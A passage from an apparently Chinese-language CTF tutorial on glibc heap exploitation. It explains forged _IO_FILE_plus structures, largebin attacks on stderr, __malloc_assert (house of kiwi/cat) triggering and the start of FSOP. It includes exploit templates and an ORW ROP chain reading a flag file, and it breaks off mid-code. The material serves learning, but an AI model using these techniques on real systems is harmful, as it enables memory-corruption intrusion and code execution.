  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div> <h5 id="具体是那种结构-猜测可能与使用的文件open函数有关-但是没试过-无论如何-要伪造的stderr是_io_file_complete--vtable-的样式此外-在libc中存在一个指向_io_file_plus结构体的_io_list_all指针-通常情况下指向_io_2_1_stderr-然后stderr又通过chain指向stdout-stdout指向stdin当出现了新的文件描述符-会插入到这个链表的头部">   具体是那种结构, 猜测可能与使用的文件open函数有关, 但是没试过. 无论如何, 要伪造的stderr是<code class="language-plaintext highlighter-rouge">_IO_FILE_COMPLETE + vtable</code> 的样式<br/>   此外, 在libc中存在一个指向<code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code>结构体的<code class="language-plaintext highlighter-rouge">_IO_list_all</code>指针, 通常情况下指向<code class="language-plaintext highlighter-rouge">_IO_2_1_stderr</code>, 然后stderr又通过chain指向stdout, stdout指向stdin<br/>   当出现了新的文件描述符, 会插入到这个链表的头部<br/></h5> <h5 id="_io_jump_t结构体-有许多操作函数-但是不同的_io_file_plus-可能会使用不同的虚表-stderrstdoutstdin使用的是_io_file_jumps">   <code class="language-plaintext highlighter-rouge">_IO_jump_t</code>结构体, 有许多操作函数, 但是不同的<code class="language-plaintext highlighter-rouge">_IO_FILE_PLUS</code>, 可能会使用不同的虚表, stderr/stdout/stdin使用的是<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_jump_t</span>
<span class="p">{</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="c">#if 0
    get_column;
    set_column;
#endif
</span><span class="p">};</span>
</code></pre></div></div> <h5 id="对于__malloc_assert的触发方法-我们需要伪造stderr结构体-以下是一个通用的模板httpsbbskanxuecomthread-273895htmmsg_header_h3_5">   对于__malloc_assert的触发方法, 我们需要伪造stderr结构体, 以下是一个通用的模板(https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_5)</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fake_io_addr</span><span class="o">=</span><span class="n">heapbase</span><span class="o">+</span><span class="mh">0xb00</span> <span class="c1"># 伪造的fake_IO结构体的地址
</span><span class="n">next_chain</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">fake_IO_FILE</span><span class="o">=</span><span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span>         <span class="c1">#_flags=rdi
</span><span class="n">fake_IO_FILE</span><span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#_IO_saveup_base rcx!=0(FSOP)
</span><span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="n">fake_io_addr</span><span class="o">+</span><span class="mh">0xb0</span><span class="p">)</span><span class="c1">#_IO_backup_base=rdx
</span><span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="n">call_addr</span><span class="p">)</span><span class="c1">#_IO_save_end=call addr(call setcontext/system)
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _chain
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heapbase</span><span class="o">+</span><span class="mh">0x1000</span><span class="p">)</span>  <span class="c1"># _lock = a writable address
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xa0</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="n">fake_io_addr</span><span class="o">+</span><span class="mh">0x30</span><span class="p">)</span><span class="c1">#_wide_data,rax1_addr
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xc0</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#mode=1
</span><span class="n">fake_IO_FILE</span> <span class="o">=</span> <span class="n">fake_IO_FILE</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0xd8</span><span class="p">,</span> <span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libcbase</span><span class="o">+</span><span class="mh">0x2160c0</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># vtable=IO_wfile_jumps+0x10
</span><span class="n">fake_IO_FILE</span> <span class="o">+=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>
<span class="n">fake_IO_FILE</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">fake_io_addr</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span>  <span class="c1"># rax2_addr
</span></code></pre></div></div> <h5 id="更加具体的模板-来自httpsxzaliyuncomt13016time__1311gqmhbkykgiqgx0hq1dunfg8ywpvdpyd">   更加具体的模板, 来自https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DunFG8YwpVDpYD</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fake_struct</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                    <span class="err">#</span><span class="n">_IO_read_end</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_read_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_write_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_write_ptr</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_write_end</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_buf_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_buf_end</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_IO_save_base</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_io_addr</span> <span class="o">+</span> <span class="mh">0xb0</span><span class="p">)</span> <span class="err">#</span><span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="n">rdx</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">call_addr</span><span class="p">)</span>           <span class="err">#</span><span class="n">_IO_save_end</span> <span class="o">=</span> <span class="n">call_addr</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_markers</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_chain</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_fileno</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_old_offset</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_cur_column</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">)</span>   <span class="err">#</span><span class="n">_lock</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="n">or</span> <span class="n">writeable</span> <span class="n">libc_addr</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_offset</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_codecvx</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_io_addr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">)</span> <span class="err">#</span><span class="n">_wide_data</span> <span class="n">rax1</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_freers_list</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_freers_buf</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">__pad5</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="err">#</span><span class="n">_mode</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">20</span>               <span class="err">#</span><span class="n">_unused2</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">_IO_wfile_jumps</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="err">#</span><span class="n">vtable</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">6</span>                 <span class="err">#</span><span class="n">padding</span>
<span class="n">fake_struct</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_io_addr</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">)</span> <span class="err">#</span><span class="n">rax2</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fake_struct</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
</code></pre></div></div> <h5 id="在具体使用时-需要更改fake_io_addr为伪造的fake_io的堆的地址-_io_save_end为要调用的函数即call_addr-_io_backup_base为执行函数时的rdx-以及修改_flags即rdi为执行函数时的rdi">   在具体使用时, 需要更改<code class="language-plaintext highlighter-rouge">fake_io_addr</code>为伪造的fake_IO的堆的地址, _IO_save_end为要调用的函数(即call_addr), _IO_backup_base为执行函数时的rdx, 以及修改_flags(即rdi)为执行函数时的rdi<br/></h5> <h5>   </h5> <h4 id="-__malloc_assert举例">  __malloc_assert举例</h4> <h5 id="这里以那道著名的-house-of-cat-举例-但是只关注largebin的部分-绕过沙箱的部分忽略-使用了__malloc_assert触发orw的方法">   这里以那道著名的 <code class="language-plaintext highlighter-rouge">house of cat</code> 举例, 但是只关注largebin的部分, 绕过沙箱的部分忽略.<br/>    使用了<code class="language-plaintext highlighter-rouge">__malloc_assert</code>触发orw的方法<br/>   </h5> <h5 id="第一步是要先泄露出libc和heap基址-这部分省略-请各显神通">   第一步是要先泄露出libc和heap基址, 这部分省略, 请各显神通<br/></h5> <h5 id="第二步是伪造一个_io_file_plus结构-用于绕过检查以及劫持虚表">   第二步是伪造一个_IO_FILE_PLUS结构, 用于绕过检查以及劫持虚表<br/></h5> <h5 id="第三步是通过largebin-attack将stderr使用伪造的结构体替换-">   第三步是通过largebin attack将stderr使用伪造的结构体替换, <br/></h5> <h5 id="第四步-弄一个rop或者是orw之类的-和二三步顺序可以互换">   第四步, 弄一个ROP或者是ORW之类的, 和二三步顺序可以互换<br/></h5> <h5 id="第五步-想办法触发__malloc_assert-常用的办法是修改top-chunk-size">   第五步, 想办法触发__malloc_assert, 常用的办法是修改top chunk size<br/></h5> <h5 id="模板中的call_addr修改为setcontext61-并在rop_addr指示的堆地址填入需要的rop链">   模板中的<code class="language-plaintext highlighter-rouge">call_addr</code>修改为<code class="language-plaintext highlighter-rouge">setcontext+61</code>, 并在<code class="language-plaintext highlighter-rouge">rop_addr</code>指示的堆地址填入需要的rop链</h5> <h5 id="完整exp可以看httpsxzaliyuncomt13016time__1311gqmhbkykgiqgx0hq1dunfg8ywpvdpyd-这里对伪造的部分做更具体地解释">   完整exp可以看https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DunFG8YwpVDpYD, 这里对伪造的部分做更具体地解释<br/></h5> <h5 id="-1">   </h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">...</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># fwd
</span><span class="bp">...</span>
<span class="c1"># fake io struct
</span><span class="n">payload</span> <span class="o">=</span> <span class="n">fake_struct</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rop_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>

<span class="nf">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># addr(2) = addr(4) , 疑似是为了方便计算偏移
</span><span class="nf">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x418</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span> 
<span class="nf">free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># victim
</span>
<span class="c1"># largebin attack(fake stderr struct)
</span><span class="nf">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a0d0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x290</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stderr</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span>

<span class="c1"># 触发第一次largebin attack(add(5)), 同时为后面一次分配堆(add(5), add(7))
</span><span class="nf">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x440</span><span class="p">,</span><span class="sh">"</span><span class="s">55555</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mh">0x430</span><span class="p">,</span><span class="sh">"</span><span class="s">./flag</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span><span class="mh">0x430</span><span class="p">,</span><span class="sh">"</span><span class="s">77777</span><span class="sh">"</span><span class="p">)</span>

<span class="n">rop</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">close</span><span class="p">)</span> <span class="c1">#close(0)
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span> <span class="c1">#open(flag)
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span> <span class="c1">#read(0,flag_addr+0x10,0x100)
</span><span class="n">rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span> <span class="c1">#puts(flag_addr+0x10)
</span>
<span class="c1"># 第二次largebin attack
</span><span class="nf">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mh">0x430</span><span class="p">,</span><span class="n">rop</span><span class="p">)</span> <span class="c1"># +0x2040 +0x2050
</span><span class="nf">free</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span><span class="mh">0x450</span><span class="p">,</span><span class="sh">"</span><span class="s">9999</span><span class="sh">"</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="nf">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x21a0e0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1370</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x28e0</span><span class="o">-</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mi">3</span><span class="p">))</span>
</code></pre></div></div> <h5 id="有几点细节需要注意">   有几点细节需要注意.<br/></h5> <h5 id="第一-这套基于__malloc_assert的打法在现在更高版本的glibc中已经不复存在了-因为__malloc_assert被删除了-但是largebin-attack的其他方法-比如fsop依然可以">   第一, 这套基于<code class="language-plaintext highlighter-rouge">__malloc_assert</code>的打法在现在更高版本的glibc中已经不复存在了, 因为<code class="language-plaintext highlighter-rouge">__malloc_assert</code>被删除了, 但是largebin attack的其他方法, 比如FSOP依然可以<br/></h5> <h5 id="第二-stderr结构体指针有时不在libc中-而是在bss段中-出现这种情况一般是使用了setvbuf-而不是setbuf或者不使用-这是因为setvbuf会在源文件中使用三个extern变量指针-在链接时被ld放入bss段-而setbuf使用的三个指针放在got内作为外部链接">   第二, stderr结构体指针有时不在libc中, 而是在<code class="language-plaintext highlighter-rouge">.bss</code>段中. 出现这种情况一般是使用了<code class="language-plaintext highlighter-rouge">setvbuf()</code>, 而不是<code class="language-plaintext highlighter-rouge">setbuf()</code>或者不使用. 这是因为<code class="language-plaintext highlighter-rouge">setvbuf()</code>会在源文件中使用三个<code class="language-plaintext highlighter-rouge">extern</code>变量指针, 在链接时被ld放入<code class="language-plaintext highlighter-rouge">.bss</code>段; 而<code class="language-plaintext highlighter-rouge">setbuf()</code>使用的三个指针放在<code class="language-plaintext highlighter-rouge">.got</code>内作为外部链接<br/></h5> <h5 id="第三-由于largebin-attack写入的是chunk-head的地址-再加上前4个字长的large-bin的信息-所以导致将这个堆块看作一个io_file_plus时-它的_flag前8字节-以及_io_read_ptr-_io_read_end-_io_read_base-_io_write_base-_io_write_ptr各八个字节实际上是难以控制的-除非有heap-overflow或者uaf之类漏洞-但是即使这样也不会影响这种攻击方法的使用">   第三, 由于largebin attack写入的是chunk head的地址, 再加上前4个字长的large bin的信息, 所以导致将这个堆块看作一个IO_FILE_PLUS时, 它的_flag(前8字节), 以及_IO_read_ptr, _IO_read_end, _IO_read_base, _IO_write_base, _IO_write_ptr(各八个字节)实际上是难以控制的, 除非有heap overflow或者UAF之类漏洞, <em>但是即使这样也不会影响这种攻击方法的使用</em>.</h5> <h3 id="fsop"> FSOP</h3> <h5 id="一个比较古老的漏洞但是进入虚表偏移时代之后fsop的形式出现了一些不同">   一个比较古老的漏洞，但是进入“虚表偏移时代”之后FSOP的形式出现了一些不同<br/></h5> <h5 id="fsop利用的两个部分第一是它的调用链第二是触发fsop">   FSOP利用的两个部分，第一是它的调用链，第二是触发FSOP</h5> <h4 id="触发io"> 触发IO</h4> <h5 id="在伪造了相应结构之后-想要进行fsop-让伪造数据被用上-需要先进入io流-在高版本的glibc中-一般有两种方式进入io流-_io_flush_all_lockp-以及house-of-kiwi方法-house-of-kiwi方法就是上面的__malloc_assert方法">   在伪造了相应结构之后, 想要进行FSOP, 让伪造数据被用上, 需要先进入IO流, 在高版本的glibc中, 一般有两种方式进入IO流: <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>, 以及<code class="language-plaintext highlighter-rouge">house of kiwi</code>方法, <code class="language-plaintext highlighter-rouge">house of kiwi</code>方法就是上面的<code class="language-plaintext highlighter-rouge">__malloc_assert</code>方法.</h5> <h4 id="_io_flush_all_lockp方法"> _IO_flush_all_lockp()方法</h4> <h5 id="这种方法是fsop的传统做法-_io_flush_all_lockp会从_io_list_all查找io_file结构体-然后分别对每个结构体flush-这个过程中会使用虚表中的_io_overflow">   这种方法是FSOP的传统做法, <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>会从<code class="language-plaintext highlighter-rouge">_IO_list_all</code>查找<code class="language-plaintext highlighter-rouge">IO_FILE</code>结构体, 然后分别对每个结构体flush, 这个过程中会使用虚表中的<code class="language-plaintext highlighter-rouge">_IO_overflow</code><br/></h5> <h5 id="触发这个函数又有一些办法-但是在高版本glibc中砍得七七八八-基本只剩下程序使用exit退出这一种比较常见又方便利用的方法">   触发这个函数又有一些办法, 但是在高版本glibc中砍得七七八八, 基本只剩下程序使用<code class="language-plaintext highlighter-rouge">exit()</code>退出这一种比较常见又方便利用的方法<br/></h5> <h5 id="精简代码">   精简代码</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="kt">int</span> <span class="n">do_lock</span><span class="p">){</span>
  <span class="p">...</span>
  <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
  <span class="p">{</span>
       <span class="p">...</span>
    <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
<span class="cp">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span>       <span class="o">||</span> <span class="p">(</span><span class="n">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
           <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
